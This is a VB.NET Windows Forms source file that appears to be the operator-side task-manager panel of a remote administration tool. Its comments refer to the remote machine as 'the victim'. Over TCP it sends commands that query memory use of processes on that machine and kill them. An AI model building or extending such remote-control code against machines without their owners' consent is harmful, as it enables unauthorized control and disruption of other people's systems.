Imports System.IO
Imports System.Text
Imports System.Net.Sockets

Public Class Task
    Public TCPClient As New TcpClient
    Public NetStream As NetworkStream
    Dim data As String
    Dim count As Integer
    Dim sendBytes As [Byte]()
    Dim selected_check As Integer = -1
    Public check_memory_process() As String

    Private Sub ListBox2_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListBox2.SelectedIndexChanged
        If Not ListBox2.SelectedIndex = -1 Then
            If Not selected_check.Equals(ListBox2.SelectedIndex) Then
                'prevent the thread send brunch of data to the victim
                ListBox2.Enabled = False
                ListBox1.SelectedIndex = -1
                ListBox1.Enabled = False
                Timer1.Enabled = False
                FlatLabel1.Visible = True
                memory.Visible = True
                memory.Text = ""
                selected_check = ListBox2.SelectedIndex
                If NetStream.CanWrite Then
                    sendBytes = Encoding.ASCII.GetBytes("Task;" + ListBox2.SelectedIndex.ToString)
                    NetStream.Flush()
                    NetStream.Write(sendBytes, 0, sendBytes.Length)
                    Timer1.Enabled = True
                End If
            End If
        End If
    End Sub

    Private Sub ListBox1_DrawItem(sender As Object, e As DrawItemEventArgs) Handles ListBox1.DrawItem
        'Draw Item - Listbox
        On Error Resume Next
        e.DrawBackground()

        If (e.State And DrawItemState.Selected) = DrawItemState.Selected Then
            If ListBox1.Enabled Then
                'Text color
                e.Graphics.FillRectangle(Brushes.MediumSpringGreen, e.Bounds)
            Else
                e.Graphics.FillRectangle(New SolidBrush(Color.FromArgb(40, 40, 40)), e.Bounds)
            End If
        End If
        Using b As New SolidBrush(e.ForeColor)
            e.Graphics.DrawString(ListBox1.GetItemText(ListBox1.Items(e.Index)), e.Font, b, e.Bounds)
        End Using
        e.DrawFocusRectangle()
    End Sub

    Private Sub ListBox2_DrawItem(sender As Object, e As DrawItemEventArgs) Handles ListBox2.DrawItem
        'Draw Item - Listbox
        On Error Resume Next
        e.DrawBackground()

        If (e.State And DrawItemState.Selected) = DrawItemState.Selected Then
            If ListBox2.Enabled Then
                'Text color
                e.Graphics.FillRectangle(Brushes.MediumSpringGreen, e.Bounds)
            Else
                e.Graphics.FillRectangle(New SolidBrush(Color.FromArgb(40, 40, 40)), e.Bounds)
            End If
        End If
        Using b As New SolidBrush(e.ForeColor)
            e.Graphics.DrawString(ListBox2.GetItemText(ListBox2.Items(e.Index)), e.Font, b, e.Bounds)
        End Using
        e.DrawFocusRectangle()
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim NetStream As NetworkStream = TCPClient.GetStream()
        If NetStream.CanRead Then
            ListBox1.Enabled = True
            ListBox2.Enabled = True
            If NetStream.DataAvailable Then
                Dim bytes(TCPClient.ReceiveBufferSize) As Byte
                NetStream.Read(bytes, 0, CInt(TCPClient.ReceiveBufferSize))
                data = Encoding.ASCII.GetString(bytes)
                Dim check() As String = data.Split("K")
                data = check(check.Length - 2) + "B"
                memory.Text = data
            End If
        End If
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim kill As String = ListBox1.Items(ListBox1.SelectedIndex).ToString
        Dim reverse As Integer = 1
        For check As Integer = 0 To ListBox1.Items.Count - 1
            If ListBox1.Items(check).ToString.Equals(kill) Then
                reverse = reverse + 1
            End If
        Next
        For check As Integer = 0 To ListBox1.Items.Count - reverse
            If ListBox1.Items(check).ToString.Equals(kill) Then
                ListBox1.Items.RemoveAt(check)
                check = check - 1
            End If
        Next
        If NetStream.CanWrite Then
            sendBytes = Nothing
            sendBytes = Encoding.ASCII.GetBytes("Kill;" + kill + ";")
            NetStream.Flush()
            NetStream.Write(sendBytes, 0, sendBytes.Length)
            Timer1.Enabled = False
            FlatLabel1.Visible = False
            memory.Visible = False
            memory.Text = ""
        End If
    End Sub

    Private Sub ListBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListBox1.SelectedIndexChanged
        If Not ListBox1.SelectedIndex = -1 Then
            If Not selected_check.Equals(ListBox1.SelectedIndex) Then
                'prevent the thread send brunch of data to the victim
                ListBox2.Enabled = False
                ListBox2.SelectedIndex = -1
                ListBox1.Enabled = False
                Timer1.Enabled = False
                FlatLabel1.Visible = True
                memory.Visible = True
                memory.Text = ""
                selected_check = ListBox1.SelectedIndex
                If NetStream.CanWrite Then
                    sendBytes = Encoding.ASCII.GetBytes("Task;" + check_memory_process(ListBox1.SelectedIndex))
                    NetStream.Flush()
                    NetStream.Write(sendBytes, 0, sendBytes.Length)
                    Timer1.Enabled = True
                End If
            End If
        End If
    End Sub

    Private Sub ListBox3_SelectedIndexChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub Task_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub
End Class
